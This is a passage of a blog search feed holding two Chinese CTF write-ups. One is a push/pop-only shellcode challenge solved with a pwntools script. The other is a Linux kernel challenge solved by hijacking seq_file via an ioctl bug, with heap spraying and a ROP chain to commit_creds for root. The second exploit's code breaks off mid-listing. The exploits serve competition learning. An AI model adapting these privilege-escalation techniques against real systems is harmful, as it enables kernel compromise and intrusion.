<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>2025 Securinets CTF PushPullPop wp</title>
    <link href="/2025/10/06/sec2025pushpullpop/"/>
    <url>/2025/10/06/sec2025pushpullpop/</url>
    
    <content type="html"><![CDATA[<p>出题人你还好吗？我不好:)</p><span id="more"></span><h1 id="Push-Pop-Shellcode"><a href="#Push-Pop-Shellcode" class="headerlink" title="Push Pop Shellcode"></a>Push Pop Shellcode</h1><p>只能有push和pop的shellcode，且push和pop的参数只能是寄存器</p><h1 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h1><p>可以用无效字节码（如<code>0x60</code>）进行截断，这样后面的字节码就不会检查了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> insn <span class="hljs-keyword">in</span> md.disasm(code, <span class="hljs-number">0</span>):<br>    name = insn.insn_name()<br>    <span class="hljs-keyword">if</span> name!=<span class="hljs-string">&quot;pop&quot;</span> <span class="hljs-keyword">and</span> name!=<span class="hljs-string">&quot;push&quot;</span> :<br>        <span class="hljs-keyword">if</span> name==<span class="hljs-string">&quot;int3&quot;</span> :<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">if</span> insn.operands[<span class="hljs-number">0</span>].<span class="hljs-built_in">type</span>!=CS_OP_REG:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br></code></pre></td></tr></table></figure><p><em>exp忘存了……🤡</em></p><p>可以把栈迁到rwx上，设rax为一个合法地址，然后push一个0（<code>add [rax], al</code>）把无效字节码改了就行</p><h1 id="预期"><a href="#预期" class="headerlink" title="预期"></a>预期</h1><p>不能截断了，鉴于不能push立即数，想造syscall只有利用内存里已有的数据</p><p>但<code>0x50f</code>不是个好找的数，就算有想靠栈迁移+pop到达也很困难，<em>而且内存内容是个玄学:(</em></p><p>后来考虑在可写段上找能当指令执行的数据（这样可以<code>push xxx; pop rsp</code>栈迁过去再迁回来），最后考虑指令<code>add [rax], dl</code>，<code>0x1000</code>是个更常见的数据，栈上稳定有一个</p><img src="/2025/10/06/sec2025pushpullpop/0x1000.png" class title="0x1000"><p>且栈上的搜索比较方便，可以通过rbp链快速跳跃</p><img src="/2025/10/06/sec2025pushpullpop/rbp.png" class title="rbp"><p>然后用<code>0x1000</code>改字节码写一个<code>0x50f</code>出来</p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.os=<span class="hljs-string">&#x27;linux&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><span class="hljs-keyword">import</span> base64<br><br>p=remote(<span class="hljs-string">&#x27;pwn-14caf623.p1.securinets.tn&#x27;</span>,<span class="hljs-number">9090</span>)<br><span class="hljs-comment">#p=remote(&#x27;127.0.0.1&#x27;,5000)</span><br>pl=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    pop r15;</span><br><span class="hljs-string">    pop r15;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop rdx&#x27;</span>)*<span class="hljs-number">0x11</span><br>pl+=asm(<span class="hljs-string">&#x27;pop rbx&#x27;</span>)*<span class="hljs-number">3</span><br>pl+=asm(<span class="hljs-string">&#x27;pop rcx&#x27;</span>)*<span class="hljs-number">2</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15; push rax;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;push rsp; push rsp; pop r14; pop r13;&#x27;</span>)<br><br>pl+=asm(<span class="hljs-string">&#x27;push r13; pop rax; pop r15; pop r15; push r11; pop rsp;&#x27;</span>)<br><br><span class="hljs-comment"># padding 1</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">0x30</span><br><br>pl+=asm(<span class="hljs-string">&#x27;pushw %cx&#x27;</span>)*<span class="hljs-number">0xf</span><br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)*<span class="hljs-number">0xf</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pushw %cx&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;popw %r15w&#x27;</span>)*<span class="hljs-number">5</span><br>pl+=asm(<span class="hljs-string">&#x27;pushw %cx&#x27;</span>)*<span class="hljs-number">5</span><br><br><span class="hljs-comment"># padding 2</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">60</span><br><br>pl+=asm(<span class="hljs-string">&#x27;push r14; pop rax; pop rsi; pop r15; pop r15;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)      <span class="hljs-comment"># pad</span><br>pl+=asm(<span class="hljs-string">&#x27;push rax; pop rsp; pop rax; pop r15;&#x27;</span>)+asm(<span class="hljs-string">&#x27;pop rsi&#x27;</span>)*<span class="hljs-number">3</span><br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">5</span>    <span class="hljs-comment"># pad</span><br><br>pl+=asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    push r13;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">    pop r10;</span><br><span class="hljs-string">    push rdi;</span><br><span class="hljs-string">    pop rax;</span><br><span class="hljs-string">    push r11;</span><br><span class="hljs-string">    pop rsi;</span><br><span class="hljs-string">    push rcx;</span><br><span class="hljs-string">    pop rdx;</span><br><span class="hljs-string">    push r11;</span><br><span class="hljs-string">    pop rsp;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">0x4a</span><br>pl+=asm(<span class="hljs-string">&#x27;push r10&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">2</span><br>pl+=asm(<span class="hljs-string">&#x27;push r13; pop rsp;&#x27;</span>)<br>pl+=asm(<span class="hljs-string">&#x27;pop r15&#x27;</span>)*<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(pl))<br>sc=base64.b64encode(pl)<br>pause()<br>p.sendlineafter(<span class="hljs-string">b&#x27;Shellcode : &#x27;</span>,sc)<br>pause()<br><br>shellcode=<span class="hljs-string">b&#x27;\x90&#x27;</span>*<span class="hljs-number">0x24a</span>+asm(shellcraft.cat(<span class="hljs-string">&#x27;/app/flag.txt&#x27;</span>))<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>WP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>shellcode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2025 ASIS CTF FileNo wp</title>
    <link href="/2025/09/18/asis2025fileno/"/>
    <url>/2025/09/18/asis2025fileno/</url>
    
    <content type="html"><![CDATA[<p>🤡</p><span id="more"></span><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>读写file-&gt;private_data</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (cmd == CMD_READ) &#123;<br>    req.val = (<span class="hljs-type">long</span>)target-&gt;private_data;<br>    <span class="hljs-keyword">if</span> (copy_to_user((<span class="hljs-type">req_t</span> __user *)arg, &amp;req, <span class="hljs-keyword">sizeof</span>(req))) &#123;<br>      ret = -EFAULT;<br>      <span class="hljs-keyword">goto</span> unlock_on_fail;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// CMD_WRITE</span><br>target-&gt;private_data = (<span class="hljs-type">void</span>*)req.val;<br>&#125;<br></code></pre></td></tr></table></figure><p>对file的要求S_ISREG最基本满足：</p><ul><li>非dir</li><li>非link</li><li>非char driver</li><li>非block driver</li><li>非pipe</li><li>非socket</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!S_ISREG(file_inode(target)-&gt;i_mode)) &#123;<br>ret = -EBADF;<br><span class="hljs-keyword">goto</span> unlock_on_fail;<br>&#125;<br></code></pre></td></tr></table></figure><p><em>最大的问题其实就是搜索有private_data的reg file……</em></p><h1 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h1><p>直接进行一个暴力搜索<code>-&gt;private_data</code>🙂，然后发现一个seq_file，之前好像见过，那就这个了！</p><h2 id="seq-file"><a href="#seq-file" class="headerlink" title="seq_file"></a>seq_file</h2><p>打开一个<code>/proc/self/stat</code>文件，file-&gt;private_data指向一个seq_file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_file</span> &#123;</span><br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">size_t</span> size;<br><span class="hljs-type">size_t</span> from;<br><span class="hljs-type">size_t</span> count;<br><span class="hljs-type">size_t</span> pad_until;<br><span class="hljs-type">loff_t</span> index;<br><span class="hljs-type">loff_t</span> read_pos;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">mutex</span> <span class="hljs-title">lock</span>;</span><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> *<span class="hljs-title">op</span>;</span><br><span class="hljs-type">int</span> poll_event;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file</span> *<span class="hljs-title">file</span>;</span><br><span class="hljs-type">void</span> *private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">seq_operations</span> &#123;</span><br><span class="hljs-type">void</span> * (*start) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">void</span> (*stop) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br><span class="hljs-type">void</span> * (*next) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v, <span class="hljs-type">loff_t</span> *pos);<br><span class="hljs-type">int</span> (*show) (<span class="hljs-keyword">struct</span> seq_file *m, <span class="hljs-type">void</span> *v);<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以劫持seq_file-&gt;buf进行任意读，伪造seq_operations劫持控制流</p><p><em>找gadget来栈迁移研究了好久（</em></p><h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><p>喷seq_file然后discard slab，pipe把page alloc回来整页伪造</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_READ    0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CMD_WRITE   0x1338</span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>  <span class="hljs-type">int</span> fd;<br>  <span class="hljs-type">long</span> val;<br>&#125; <span class="hljs-type">req_t</span>;<br><br><br><span class="hljs-type">size_t</span> <span class="hljs-title function_">dev_read</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = <span class="hljs-number">0</span>,<br>&#125;;<br>ioctl(fd_dev, CMD_READ, &amp;arg);<br><span class="hljs-keyword">return</span> arg.val;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dev_write</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_dev, <span class="hljs-type">int</span> fd, <span class="hljs-type">size_t</span> val)</span>&#123;<br><span class="hljs-type">req_t</span> arg = &#123;<br>.fd = fd,<br>.val = val,<br>&#125;;<br><span class="hljs-keyword">return</span> ioctl(fd_dev, CMD_WRITE, &amp;arg);<br>&#125;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">fd_addr</span> &#123;</span><br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">size_t</span> addr;<br>&#125; object;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>N_PAGE_NUM0xe</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_FDS0x22*N_PAGE_NUM</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> N_PAGES0x10</span><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x1000</span>];<br>object sprays[<span class="hljs-number">0x13</span>][<span class="hljs-number">0x22</span>];<br><span class="hljs-type">int</span> pipe_fd[N_PAGES][<span class="hljs-number">2</span>];<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hack</span><span class="hljs-params">(<span class="hljs-type">size_t</span> target)</span>&#123;<br><span class="hljs-type">size_t</span> *ptr = (<span class="hljs-type">size_t</span> *)buffer;<br><br><span class="hljs-comment">// 0xffffffff8132b8f4: pop rsp; ret;</span><br><span class="hljs-comment">// 0xffffffff819e613f: push rdi; adc ch, cl; imul edi, edi, -1; jmp qword ptr [rsi + 0x45]</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RDI_JMP_RSI0x9e613f</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RSP_RET0x32b8f4</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RSP_ADD_88_RET0x20119C</span><br><br><span class="hljs-comment">// fake seq_file</span><br>ptr[<span class="hljs-number">0</span>] = kernel_base+RSP_ADD_88_RET;<br>ptr[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">3</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">6</span>] = <span class="hljs-number">0x10</span>;<br>ptr[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">9</span>] = target+<span class="hljs-number">0x48</span>;<br>ptr[<span class="hljs-number">10</span>] = target+<span class="hljs-number">0x48</span>;<br>ptr[<span class="hljs-number">11</span>] = target+<span class="hljs-number">0x80</span>;<span class="hljs-comment">// [rdi+80h] fake_operations</span><br>ptr[<span class="hljs-number">12</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">14</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">15</span>] = <span class="hljs-number">0</span>;<br><br>*(<span class="hljs-type">size_t</span> *)((<span class="hljs-type">size_t</span>)buffer+<span class="hljs-number">0x28</span>+<span class="hljs-number">0x45</span>) = kernel_base + POP_RSP_RET;<br><br><span class="hljs-comment">// fake seq_operations</span><br>ptr[<span class="hljs-number">16</span>] = kernel_base + PUSH_RDI_JMP_RSI;<br>ptr[<span class="hljs-number">17</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">18</span>] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// rop chain</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET0x306a4d</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED0xE3BF60</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS    0x2a3a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAP_RET0x1787</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RCX_RET 0x2af543</span><br>ptr[<span class="hljs-number">89</span>] = kernel_base+POP_RDI_RET;<br>ptr[<span class="hljs-number">90</span>] = kernel_base+INIT_CRED;<br>ptr[<span class="hljs-number">91</span>] = kernel_base+COMMIT_CREDS;<br>ptr[<span class="hljs-number">92</span>] = kernel_base+SWAP_RET;<br>ptr[<span class="hljs-number">93</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">94</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">95</span>] = (<span class="hljs-type">size_t</span>)&amp;get_root_shell;<br>ptr[<span class="hljs-number">96</span>] = user_cs;<br>ptr[<span class="hljs-number">97</span>] = user_rflags;<br>ptr[<span class="hljs-number">98</span>] = user_sp;<br>ptr[<span class="hljs-number">99</span>] = user_ss;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br>write(pipe_fd[i][<span class="hljs-number">1</span>], buffer, <span class="hljs-keyword">sizeof</span>(buffer));<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>save_status();<br>bind_core(<span class="hljs-number">0</span>);<br><br><span class="hljs-type">int</span> fd = open(<span class="hljs-string">&quot;/dev/vuln&quot;</span>, O_RDWR);<br><span class="hljs-type">size_t</span> pre = <span class="hljs-number">-1</span>;<br><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;N_PAGES; i++)&#123;<br><span class="hljs-keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>perror(<span class="hljs-string">&quot;pipe&quot;</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-type">int</span> i=<span class="hljs-number">-1</span>, j=<span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(i &lt; N_PAGE_NUM)&#123;<br><span class="hljs-type">int</span> fd_tmp = open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>        <span class="hljs-keyword">if</span>(fd_tmp &lt; <span class="hljs-number">0</span>)&#123;<br>            perror(<span class="hljs-string">&quot;open&quot;</span>);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>        &#125;<br><br>read(fd_tmp, buffer, <span class="hljs-number">8</span>);<br><br>        <span class="hljs-type">size_t</span> addr = dev_read(fd, fd_tmp);<br><span class="hljs-keyword">if</span>(pre != (addr &amp; <span class="hljs-number">0xfffffffffffff000</span>))&#123;<br>pre = addr &amp; <span class="hljs-number">0xfffffffffffff000</span>;<br>i++;<br>j=<span class="hljs-number">0</span>;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>j++;<br>&#125;<br>sprays[i][j].fd = fd_tmp;<br>sprays[i][j].addr = addr;<br>page_offset_base = addr &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, %d, %d, %lx\n&quot;</span>,i, j, fd_tmp, addr);<br>&#125;<br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Spray over.&quot;</span>);<br><br><span class="hljs-keyword">for</span>(i=N_PAGE_NUM<span class="hljs-number">-3</span>; i&lt;N_PAGE_NUM; i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x22</span>; j++)&#123;<br>sprays[i][j].addr = sprays[i-(N_PAGE_NUM<span class="hljs-number">-3</span>)][j].addr;<br>dev_write(fd, sprays[i][j].fd, sprays[i][j].addr);<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d, %d, %d, %lx\n&quot;</span>,i, j, sprays[i][j].fd, sprays[i][j].addr);<br>&#125;<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Write over.&quot;</span>);<br><br><span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>; i&lt;N_PAGE_NUM<span class="hljs-number">-3</span>; i++)&#123;<br><span class="hljs-keyword">for</span>(j=<span class="hljs-number">0</span>; j&lt;<span class="hljs-number">0x22</span>; j++)&#123;<br>close(sprays[i][j].fd);<br>&#125;<br>&#125;<br><br><span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Close over.&quot;</span>);<br><br><span class="hljs-type">size_t</span> *ptr = (<span class="hljs-type">size_t</span> *)buffer;<br>ptr[<span class="hljs-number">0</span>] = page_offset_base + <span class="hljs-number">0x9d000</span>;<br>ptr[<span class="hljs-number">1</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">3</span>] = <span class="hljs-number">0x2000</span>;<br>ptr[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">5</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">6</span>] = <span class="hljs-number">8</span>;<br>ptr[<span class="hljs-number">7</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">8</span>] = <span class="hljs-number">0</span>;<br>ptr[<span class="hljs-number">9</span>] = <span class="hljs-number">0xdeadbeef</span>; <span class="hljs-comment">// self + 0x48</span><br>ptr[<span class="hljs-number">10</span>] = <span class="hljs-number">0xdeadbeef</span>; <span 